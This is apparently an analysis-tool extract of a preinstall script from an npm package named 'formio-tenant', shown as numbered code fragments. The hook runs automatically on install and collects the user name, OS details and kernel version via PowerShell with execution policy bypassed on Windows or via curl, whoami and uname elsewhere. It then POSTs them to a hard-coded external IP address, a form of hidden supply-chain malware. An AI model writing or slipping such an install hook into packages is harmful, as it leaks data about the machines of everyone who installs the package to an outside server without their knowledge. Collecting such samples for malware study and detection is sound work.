// File: tmp/tmpfdedbh21/formio-tenant/package/preinstall.js
// ======================================================================
Line 2: _tmp_0 = require('child_process')
Line 3: const url = 'http://206.189.139.175:8080'
Line 6: {
    // On Windows, use PowerShell.
    // Retrieve the current user, OS caption, and OS version,
    // then send them via Invoke-WebRequest to the remote URL.
    const psCommand =
      `& { ` +
      `$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name; ` +
      `$os = (Get-CimInstance Win32_OperatingSystem).Caption; ` +
      `$version = (Get-CimInstance Win32_OperatingSystem).Version; ` +
      `Invoke-WebRequest -Uri '${url}' -Method POST -Body "$user - $os - $version" ` +
      `}`;
    const winCmd = `powershell -ExecutionPolicy Bypass -NoProfile -Command "${psCommand}"`;
    // Execute and inherit stdio so that any output or errors are visible.
    execSync(winCmd, { stdio: 'inherit' });
  }
Line 17: <operator>.formatString("powershell -ExecutionPolicy Bypass -NoProfile -Command "", psCommand, """)
Line 19: execSync(winCmd, { stdio: 'inherit' })
Line 20: {
    // On Linux (or any non-Windows), use curl.
    // The command now sends the current user, full OS info, and kernel version.
    const linuxCmd = `curl -X POST -d "user=$(whoami)&os=$(uname -a)&kernel=$(uname -r)" ${url}`;
    execSync(linuxCmd, { stdio: 'inherit' });
  }
Line 24: execSync(linuxCmd, { stdio: 'inherit' })
Line 28: process.exit(1)
